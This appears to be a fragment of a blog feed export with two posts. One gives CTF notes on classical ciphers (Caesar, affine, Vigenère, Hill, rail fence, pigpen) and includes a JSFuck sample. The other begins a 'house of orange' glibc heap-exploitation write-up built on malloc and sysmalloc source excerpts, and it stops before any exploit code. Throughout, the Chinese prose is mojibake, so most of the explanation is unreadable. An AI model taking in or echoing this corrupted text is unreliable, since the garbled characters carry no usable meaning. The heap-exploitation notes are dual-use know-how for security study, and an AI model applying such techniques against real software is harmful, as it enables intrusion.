<pre><code>å‡¯æ’’å¯†ç æ˜¯ä¸€ç§æœ€ä¸ºç®€å•çš„æ›¿æ¢å¯†ç ï¼Œå³å­—æ¯è¡¨ä¸Šçš„æ‰€æœ‰çš„å­—æ¯å‘ä¸€ä¸ªæ–¹å‘åç§»nä½åè¢«æ›¿æ¢ä¸ºå¯†æ–‡ï¼Œå¦‚ï¼šå½“n=2æ—¶ï¼ŒAå°±è¢«æ›¿æ¢æˆäº†Cï¼Œå‡¯æ’’åŠå…¶å˜ç§ç»å¸¸ä¼šå‡ºç°åœ¨CTFå¤å…¸å¯†ç å­¦çš„é¢˜ç›®ä¸­ï¼Œå…¶åŠ è§£å¯†å…¬å¼ä¸ºï¼š
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
<pre><code>    ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œå½“æˆ‘ä»¬çŸ¥é“ä¸€ä¸²å¯†æ–‡æ˜¯ç”±å‡¯æ’’åŠ å¯†å¾—æ¥çš„æ—¶å€™ï¼Œå³ä½¿æˆ‘ä»¬ä¸çŸ¥åˆ°å¯†é’¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç©·ä¸¾æ³•è½»æ˜“çš„ç ´è§£ã€‚
</code></pre>
<h3 id="ä»¿å°„å¯†ç ï¼ˆAffine-cipherï¼‰"><a class="header-anchor" href="#ä»¿å°„å¯†ç ï¼ˆAffine-cipherï¼‰">Â¶</a>ä»¿å°„å¯†ç ï¼ˆAffine cipherï¼‰</h3>
<pre><code>ä»¿å°„å¯†ç ä½œä¸ºä¸€ç§å•è¡¨æ›¿æ¢å¯†ç ï¼Œç è¡¨çš„æ¯ä¸ªå­—æ¯ç›¸åº”çš„å€¼ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ•°å­¦å‡½æ•°å¯¹åº”ä¸€ä¸ªæ•°å€¼
å…¶åŠ è§£å¯†å…¬å¼å¦‚ä¸‹ï¼š
</code></pre>
<p>åŠ å¯†ï¼š<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
è§£å¯†ï¼š<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
ä¹˜æ³•é€†å…ƒæ±‚æ³•ï¼š<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
<em><strong>å…³äºå…¬å¼</strong></em></p>
<pre><code>aä¸mäº’ç´ ï¼Œm=26,xä¸ºåŸæ–‡ï¼Œbä¸ºåç§»é‡
</code></pre>
<p><em><strong>å…³äºä¹˜æ³•é€†å…ƒ</strong></em></p>
<pre><code>    ä¾‹å¦‚ï¼Œæ±‚5å…³äºæ¨¡14çš„ä¹˜æ³•é€†å…ƒï¼š14=5*2+4ï¼Œ5=4*1+1è¯´æ˜5ä¸14äº’ç´ ï¼Œå­˜åœ¨5å…³äº14çš„ä¹˜æ³•é€†å…ƒã€‚1=5-4=5-(14-5*2)=5*3-14å› æ­¤ï¼Œ5å…³äºæ¨¡14çš„ä¹˜æ³•é€†å…ƒä¸º3ã€‚
</code></pre>
<p><em><strong>ç ´è§£</strong></em></p>
<pre><code>è‹¥a=1,åˆ™åˆšå¥½å°±æ˜¯å‡¯æ’’å¯†ç ã€‚
è‹¥a!=1,æˆ‘ä»¬å¯ä»¥çŸ¥é“m=26ï¼Œaä¸mäº’ç´ ï¼Œå³å¯å¾—åˆ°çš„å–å€¼èŒƒå›´ä¸ºï¼š1ï¼Œ3ï¼Œ5ï¼Œ7ï¼Œ9ï¼Œ11ï¼Œ13ï¼Œ15ï¼Œ17ï¼Œ19ï¼Œ21ï¼Œ23ï¼Œ25ä¸­çš„ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸€å…±æœ‰12*26=312ç§å¯èƒ½çš„å¯†é’¥ï¼Œæ­¤æ—¶é‡‡ç”¨ç©·ä¸¾æ³•å³å¯æ”»å‡»ã€‚
è‹¥æˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸¤ä¸ªåŠ å¯†åçš„å­—æ¯c1,c2ã€‚é‚£ä¹ˆé€šè¿‡å…¬å¼c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;åˆ™c1-c2å¯å¾—ï¼šc1-c2=a(x1-x2) mod må³å¯æ±‚è§£aï¼Œå†ç”¨ç©·ä¸¾æ³•å¾—åˆ°bã€‚
</code></pre>
<h2 id="4-å¤šè¡¨æ›¿æ¢å¯†ç "><a class="header-anchor" href="#4-å¤šè¡¨æ›¿æ¢å¯†ç ">Â¶</a>4.å¤šè¡¨æ›¿æ¢å¯†ç </h2>
<h3 id="4-1å¤šè¡¨æ›¿æ¢åŸç†"><a class="header-anchor" href="#4-1å¤šè¡¨æ›¿æ¢åŸç†">Â¶</a>4.1å¤šè¡¨æ›¿æ¢åŸç†</h3>
<pre><code>ç”±äºå•è¡¨æ›¿æ¢å¯†ç å®¹æ˜“è¢«é¢‘ç‡åˆ†æç ´è§£ï¼Œäººä»¬æå‡ºäº†å¤šè¡¨æ›¿æ¢åŠ å¯†ï¼Œå³ç”¨å¤šä¸ªç è¡¨æ¥ä¾æ¬¡å¯¹æ˜æ–‡æ¶ˆæ¯çš„å­—æ¯è¿›è¡Œä»£æ¢ã€‚ç›¸è¾ƒäºå•è¡¨æ›¿æ¢ï¼Œå¤šè¡¨æ›¿æ¢åï¼Œå¯†æ–‡å‡ ä¹ä¸å†ä¿æŒåŸæ¥çš„é¢‘ç‡ï¼Œæ‰€ä»¥æ›´åŠ éš¾ä»¥ç ´è§£ï¼Œæˆ‘ä»¬ä¸€èˆ¬åªèƒ½é€šè¿‡å¯»æ‰¾ç®—æ³•å®ç°å¯¹åº”çš„å¼±ç‚¹è¿›è¡Œç ´è§£ã€‚åœ¨å¤šè¡¨æ›¿æ¢ä¸­ï¼Œä»¥Playfairã€Vigenereã€Nihilistã€Hillç­‰è¾ƒä¸ºå‡ºåï¼Œè¿™é‡Œæˆ‘ä»¬æŒ‡é€‰æ‹©åˆ†æå…¶ä¸­çš„å‡ ç§ã€‚
</code></pre>
<h3 id="4-2autokey-ç»´å‰å°¼äºš"><a class="header-anchor" href="#4-2autokey-ç»´å‰å°¼äºš">Â¶</a>4.2autokey/ç»´å‰å°¼äºš</h3>
<pre><code>ç»´å‰å°¼äºšå¯†ç ï¼Œä½œä¸ºæœ€ç»å…¸çš„å¤šè¡¨å¯†ç ï¼Œå…¶ç è¡¨å¦‚ä¸‹å›¾ï¼š
ç è¡¨ç¬¬ä¸€æ’å¯¹åº”æ˜æ–‡ï¼Œç¬¬ä¸€åˆ—å¯¹åº”å¯†é’¥ã€‚ä¾‹å¦‚ï¼š
æ˜æ–‡ä¸ºï¼ši like crypto
å¯†é’¥ä¸ºï¼šnssctf
å¯†æ–‡ä¸ºï¼šv damx heqhvh
</code></pre>
<p>ç ´è§£<br>
ç”±äºç»´å‰å°¼äºšå¯†ç å±äºå¤šè¡¨åŠ å¯†ï¼Œæ‰€ä»¥ä¸€ä¸ªå­—æ¯å¯èƒ½è¢«åŠ å¯†æˆä¸åŒçš„å¯†æ–‡ï¼Œç”±äºå¯†é’¥æ˜¯é‡å¤ä½¿ç”¨çš„ï¼Œæ‰€ä»¥åªè¦çŸ¥é“äº†å¯†é’¥çš„é•¿åº¦ï¼Œå°±å¯ä»¥å°†å…¶çœ‹æˆæ˜¯äº¤ç»‡åœ¨ä¸€èµ·çš„å‡¯æ’’å¯†ç ï¼Œæ¯ä¸€ä¸ªéƒ½å¯ä»¥å•ç‹¬ç ´è§£ã€‚å¯†é’¥é•¿åº¦å¯ä»¥ä½¿ç”¨å¡è¥¿æ–¯åŸºè¯•éªŒæ¥å¾—åˆ°ã€‚</p>
<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
<pre><code>Autokeyä¸ç»´å‰å°¼äºšå¯†ç å¯†ç ç±»ä¼¼ï¼Œè‡ªåŠ¨å¯†é’¥å¯†ç ï¼ˆAutokeyï¼‰ä¸»è¦æœ‰ä¸¤ç§ï¼Œå…³é”®è¯è‡ªåŠ¨å¯†é’¥å¯†ç å’ŒåŸæ–‡è‡ªåŠ¨å¯†é’¥å¯†ç ã€‚æ‰€ä»¥å®ƒæ¯”ç»´å‰å°¼äºšæ›´åŠ å®‰å…¨ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥å…³é”®è¯è‡ªåŠ¨å¯†é’¥ä¸ºä¾‹ï¼š
æ˜æ–‡ï¼šTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
å…³é”®è¯ï¼šCULTURE
è‡ªåŠ¨ç”Ÿæˆå¯†é’¥ï¼šCULTURE THE QUICK BROWN FOX JUMPS OVER THE
å¯†æ–‡ï¼šVBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
</code></pre>
<h3 id="4-3å¸Œå°”å¯†ç "><a class="header-anchor" href="#4-3å¸Œå°”å¯†ç ">Â¶</a>4.3å¸Œå°”å¯†ç </h3>
<pre><code>å¸Œå°”å¯†ç ï¼ˆHillï¼‰ä½¿ç”¨æ¯ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­çš„é¡ºåºä½œä¸ºå…¶å¯¹åº”çš„æ•°å­—ï¼Œå³A=0ï¼ŒB=1ï¼ŒC=2 ç­‰ï¼Œç„¶åå°†æ˜æ–‡è½¬åŒ–ä¸º n ç»´å‘é‡ï¼Œè·Ÿä¸€ä¸ª n Ã— n çš„çŸ©é˜µç›¸ä¹˜ï¼Œå†å°†å¾—å‡ºçš„ç»“æœæ¨¡ 26ã€‚åŠ å¯†çŸ©é˜µå¿…é¡»æ˜¯å¯é€†çš„ï¼Œå¦åˆ™å°±ä¸å¯èƒ½è§£ç ã€‚åªæœ‰çŸ©é˜µçš„è¡Œåˆ—å¼å’Œ 26 äº’è´¨ï¼Œæ‰æ˜¯å¯é€†çš„ã€‚
</code></pre>
<p>åŠ å¯†ï¼š<br>
<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
è§£å¯†ï¼š<br>
æ±‚å‡ºåŠ å¯†çŸ©é˜µçš„é€†çŸ©é˜µç„¶ååŒå¯†æ–‡ç›¸ä¹˜åå†å¯¹ç­‰åˆ°çš„çŸ©é˜µæ¨¡26(äººæ‡’å°±ä¸ä¸Šå›¾äº†)</p>
<h2 id="5-å…¶ä»–å¯†ç "><a class="header-anchor" href="#5-å…¶ä»–å¯†ç ">Â¶</a>5.å…¶ä»–å¯†ç </h2>
<h4 id="åŸ¹æ ¹å¯†ç ï¼š"><a class="header-anchor" href="#åŸ¹æ ¹å¯†ç ï¼š">Â¶</a>åŸ¹æ ¹å¯†ç ï¼š</h4>
<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
<h4 id="æ …æ å¯†ç ï¼š"><a class="header-anchor" href="#æ …æ å¯†ç ï¼š">Â¶</a>æ …æ å¯†ç ï¼š</h4>
<pre><code>æ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯æŠŠè¦åŠ å¯†çš„æ˜æ–‡åˆ†æˆNä¸ªä¸€ç»„ï¼Œç„¶åæŠŠæ¯ç»„çš„ç¬¬1ä¸ªå­—è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„è¯ã€‚
</code></pre>
<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">Â¶</a>JSFuck:</h4>
<p>å½¢å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">åŸä½œè€…github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">Â¶</a>BrainFuck</h4>
<pre><code>ä¸€ç§æå°ä¼—çš„è®¡ç®—æœºè¯­è¨€ï¼Œç”±â€œ&gt;ã€&lt;ã€+ã€-ã€.ã€,ã€[ã€]&quot;å…«ä¸ªç¬¦å·ç»„æˆã€‚è¯¥è¯­è¨€ç”±ç›®å‰æœ‰ä¸“é—¨çš„è§£é‡Šå™¨ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œäº†è§£ã€‚
</code></pre>
<h4 id="çŒªåœˆåŠå…¶å˜å½¢"><a class="header-anchor" href="#çŒªåœˆåŠå…¶å˜å½¢">Â¶</a>çŒªåœˆåŠå…¶å˜å½¢</h4>
<pre><code>çŒªåœˆå¯†ç ï¼ˆäº¦ç§°æœ±é«˜å¯†ç ã€å…±æµä¼šæš—å·ã€å…±æµä¼šå¯†ç æˆ–å…±æµä¼šå‘˜å¯†ç ï¼‰ï¼Œæ˜¯ä¸€ç§ä»¥æ ¼å­ä¸ºåŸºç¡€çš„ç®€å•æ›¿ä»£å¼å¯†ç ã€‚å³ä½¿ä½¿ç”¨ç¬¦å·ï¼Œä¹Ÿä¸ä¼šå½±å“å¯†ç åˆ†æï¼Œäº¦å¯ç”¨åœ¨å…¶å®ƒæ›¿ä»£å¼çš„æ–¹æ³•ã€‚
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
<h4 id="è·³èˆçš„å°äºº"><a class="header-anchor" href="#è·³èˆçš„å°äºº">Â¶</a>è·³èˆçš„å°äºº</h4>
<pre><code>å‡ºè‡ªã€Šç¦å°”æ‘©æ–¯ã€‹çš„å¯†ç 
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
<h4 id="æ¥è‡ªå®‡å®™çš„ä¿¡å·"><a class="header-anchor" href="#æ¥è‡ªå®‡å®™çš„ä¿¡å·">Â¶</a>æ¥è‡ªå®‡å®™çš„ä¿¡å·</h4>
<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
<h4 id="å¤ç²¾çµç "><a class="header-anchor" href="#å¤ç²¾çµç ">Â¶</a>å¤ç²¾çµç </h4>
<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
<pre><code>é™¤äº†ä»¥ä¸Šåˆ—å‡ºæ¥çš„è¿™äº›ï¼Œè¿˜æœ‰ç›²æ–‡ã€æ•°å­—ç›²æ–‡ã€éŸ³ç¬¦åŠ å¯†ã€01248ã€ä¸ä½›è®ºç¦…ç­‰ä¹Ÿæ›¾å‡ºç°åœ¨CTFæ¯”èµ›ä¸­ã€‚
</code></pre>
<h3 id="6-å¸¸ç”¨ç½‘ç«™"><a class="header-anchor" href="#6-å¸¸ç”¨ç½‘ç«™">Â¶</a>6.å¸¸ç”¨ç½‘ç«™</h3>
<pre><code>http://ctf.ssleye.com/#
https://quipqiup.com/
</code></pre>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>cryptoç¬”è®°</tag>
        <tag>å¤å…¸å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_orange</title>
    <url>/2021/10/04/house-of-orange/</url>
    <content><![CDATA[<h1>house of orange</h1>
<h2 id="åˆ©ç”¨åœºæ™¯"><a class="header-anchor" href="#åˆ©ç”¨åœºæ™¯">Â¶</a>åˆ©ç”¨åœºæ™¯</h2>
<pre><code>æ— freeå‡½æ•°çš„å †æº¢å‡ºï¼šæ²¡æœ‰freeå‡½æ•°ï¼Œæˆ–è€…æ˜¯æ— æ³•è°ƒç”¨freeå‡½æ•°freeæŒ‡å®šçš„å †å—
</code></pre>
<span id="more"></span>
<h2 id="malloc-top-chunk-æºç åˆ†æ"><a class="header-anchor" href="#malloc-top-chunk-æºç åˆ†æ">Â¶</a>malloc top chunk æºç åˆ†æ</h2>
<p><img src="http://static.zybuluo.com/hgggg/l40dvsvhi9dxg2pbicbn4yiz/9.png" alt="9.png-18.8kB"><br>
å¦‚å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬å¯ä»¥ä»heapå¤„æº¢å‡ºçš„æ—¶å€™ï¼Œå°±å¯ä»¥è¦†ç›–top chunkçš„sizeå’Œp_sizeï¼ˆä¸Šé¢è¿™å¼ å›¾ç”»çš„æ—¶å€™ç”»é”™äº†Pæ‰“æˆDäº†ï¼‰</p>
<p>æ¥ä¸‹æ¥æ¥çœ‹top chunkçš„æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ç”¨æˆ·ç”³è¯·çš„chunk sizeå°äºtop chunk sizeæ—¶ï¼Œä¼šä»top chunkä¸­åˆ†å‰²ä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ä½¿ç”¨</p>
<p>è€Œå½“ç”¨æˆ·ç”³è¯·çš„chunk sizeå¤§äºtop chunk sizeæ—¶ï¼Œåˆ™ä¼šå»è°ƒç”¨sysmalloc</p>
<p>æ¥çœ‹ä¸‹syscall</p>
<p>å¦‚æœarenaä¸ºç©ºæˆ–è€…éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°å¤§äºä½¿ç”¨mmapè¿›è¡Œåˆ†é…çš„é˜€å€¼mp_.mmap_thresholdä¸”mp_.n_mmapsåˆ¤æ–­ç³»ç»Ÿè¿˜å¯ä»¥æœ‰å¯ä»¥ä½¿ç”¨mmapåˆ†é…çš„ç©ºé—´ï¼Œå°±ä¼šå»è°ƒç”¨mmapæ¥åˆ†é…å†…å­˜</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">         <span class="comment">/* çœç•¥ */</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ä¼šå¯¹top chunkè¿›è¡Œæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;      <span class="comment">/* top chunk çš„æŒ‡é’ˆ */</span></span><br><span class="line">old_size = chunksize (old_top);   <span class="comment">/* top chunk çš„å¤§å° */</span></span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">/* top chunk çš„å°¾éƒ¨åœ°å€ */</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™ä¹‹åä¼šå¯¹top chunk è¿›è¡Œæ‰©å±•,å½“arena == main arenaæ—¶ä¼šå…ˆè°ƒç”¨grow_heapæ¥æ‰©å±•ï¼Œè‹¥æ‰©å±•å¤±è´¥ï¼Œåˆ™ä¼šè¿›å…¥elesè·¯çº¿ï¼Œæœ€ç»ˆè§¦å‘ _int_free (av, old_top, 1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr (old_top);</span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                  | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          ......</span><br><span class="line">        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>åŒç†ï¼Œå½“arena != main_arena æ—¶ä¹Ÿä¼šè§¦å‘  _int_free (av, old_top, 1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (snd_brk != (char *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       If not the first time through, we either have a</span><br><span class="line">       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="line">       double fencepost at old_top to prevent consolidation with space</span><br><span class="line">       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="line">       marked as inuse and are in any case too small to use.  We need</span><br><span class="line">       two to make sizes and alignments work out.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    if (old_size != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        /*</span><br><span class="line">           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="line">           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="line">           enough space in old_top to do this.</span><br><span class="line">         */</span><br><span class="line">        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">           Note that the following assignments completely overwrite</span><br><span class="line">           old_top when old_size was previously MINSIZE.  This is</span><br><span class="line">           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="line">           lost.</span><br><span class="line">         */</span><br><span class="line">        chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        /* If possible, release the rest. */</span><br><span class="line">        if (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            _int_free (av, old_top, 1);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>ç”»ä¸ªç®€å•çš„æµç¨‹å›¾æ¥æ€»ç»“ä¸€ä¸‹</p>
<p><img src="http://static.zybuluo.com/hgggg/o5w1swm10mrscnnqtes1l2bo/10.png" alt="10.png-53.6kB"><br>
